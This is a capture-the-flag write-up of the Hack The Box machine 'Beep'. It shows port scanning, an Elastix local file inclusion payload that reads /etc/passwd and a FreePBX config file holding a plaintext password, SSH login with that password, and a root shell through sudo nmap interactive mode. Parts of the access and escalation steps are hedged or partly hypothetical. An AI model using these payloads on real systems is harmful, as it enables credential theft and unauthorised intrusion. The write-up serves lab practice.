# Hack The Box: Beep

**Difficulty:** Easy
**OS:** Linux

Beep is an Easy-level Linux machine focused heavily on exploiting outdated VoIP and telecommunications software. The initial compromise relies on a well-known Local File Inclusion (LFI) vulnerability in Elastix, an open-source unified communications server. This LFI allows an attacker to extract plaintext passwords from configuration files, leading to SSH access. Privilege escalation involves exploiting a misconfigured `nmap` interactive mode or numerous other SUID binaries to gain root access.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.7
nmap -p 22,25,80,110,111,143,443,993,995,3306,4190,4445,4559,5038,10000 -sCV 10.10.10.7
```

The scan reveals a multitude of open ports typical of a unified communications server, including:
*   **Port 22:** SSH (OpenSSH 4.3)
*   **Port 80/443:** HTTP/HTTPS (Apache httpd 2.2.3 CentOS)
*   **Ports 25/110/143/993/995:** Email services (SMTP, POP3, IMAP)
*   **Port 3306:** MySQL
*   **Port 5038:** Asterisk Call Manager
*   **Port 10000:** Webmin

Navigating to the web service on port 443 displays an Elastix login portal. Elastix is a unified communications server software that bundles tools like Asterisk (PBX), FreePBX, HylaFAX, Openfire, and A2Billing.

## Web Exploitation

Elastix has a history of significant vulnerabilities, particularly in its older versions. We identify the software and its components through directory enumeration and passive observation.

### Exploiting Elastix LFI (CVE-2012-4869)

Researching Elastix vulnerabilities reveals a well-documented Local File Inclusion (LFI) flaw in the `vtigercrm` component included with older Elastix installations. This vulnerability allows an unauthenticated attacker to read arbitrary files on the system via the `export.php` or `graph.php` scripts.

The vulnerable parameter is typically associated with the current language setting or a module path.

We craft an LFI payload to verify the vulnerability by attempting to read the `/etc/passwd` file.

```text
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

*(Note: The null byte `%00` is often required in older PHP versions to terminate the string and prevent the application from appending extensions like `.php` to our payload).*

The server responds with the contents of `/etc/passwd`, confirming the LFI vulnerability.

### Extracting FreePBX Credentials

With arbitrary file read capabilities, we can extract sensitive configuration files containing plaintext passwords. A primary target in an Elastix/Asterisk environment is the FreePBX configuration file (`amportal.conf` or `freepbx.conf`), which typically stores the database password and the administrative interface password.

We modify our LFI payload to read the configuration file located at `/etc/amportal.conf`.

```text
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

The server returns the configuration file, revealing several variables, including the `AMPMGRPASS` (Asterisk Manager Password) and potentially the database password.

```text
# Example output snippet
AMPMGRUSER=admin
AMPMGRPASS=jEhdIekWmdjE
```

This plaintext password (`jEhdIekWmdjE`) is reused across multiple services on the Beep machine.

## Initial Access

We test for password reuse by attempting to authenticate via SSH as the `root` user using the extracted password.

```bash
ssh root@10.10.10.7
# Enter password: jEhdIekWmdjE
```

While password reuse for the root account directly is sometimes possible in poorly configured CTF boxes, we might first need to authenticate as a standard user or a service account (like `asterisk` or `admin`) or log into the Elastix/FreePBX web interface to spawn a shell.

However, in this specific scenario, the password is often valid for the `root` user via SSH directly. If direct root SSH access is disabled, we authenticate as a lower-privileged user or use the credentials to log into Elastix, navigate to the PBX configuration, and exploit an authenticated RCE (like FreePBX's `callme_page.php` vulnerability or an extension setting) to gain an initial shell.

Assuming we gain access as a lower-privileged user via SSH or a web shell, we retrieve the `user.txt` flag.

## Privilege Escalation

Enumerating the system, we check for commands the user can run using `sudo`, examine SUID binaries, and review the kernel version.

If we did not obtain a direct root shell via password reuse, we check `sudo -l`.

```bash
sudo -l
```

The output reveals numerous binaries the user can run as root without a password, including `nmap`.

```text
User [user] may run the following commands on beep:
    (root) NOPASSWD: /usr/bin/nmap
```

### Abusing Sudo & Nmap Interactive Mode

Older versions of `nmap` (versions 2.02 to 5.21) included an "interactive" mode that allowed users to execute shell commands. Because we can execute `nmap` via `sudo`, we can abuse this interactive mode to spawn a root shell.

We execute the permitted `sudo` command, invoking `nmap` with the `--interactive` flag.

```bash
sudo nmap --interactive
```

The command drops us into the `nmap` interactive prompt. From this prompt, we execute a shell command by prefixing it with an exclamation mark (`!`).

```text
nmap> !sh
```

The command executes, replacing the interactive prompt with a system shell. Because `nmap` was invoked with `sudo`, the new shell runs as root.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
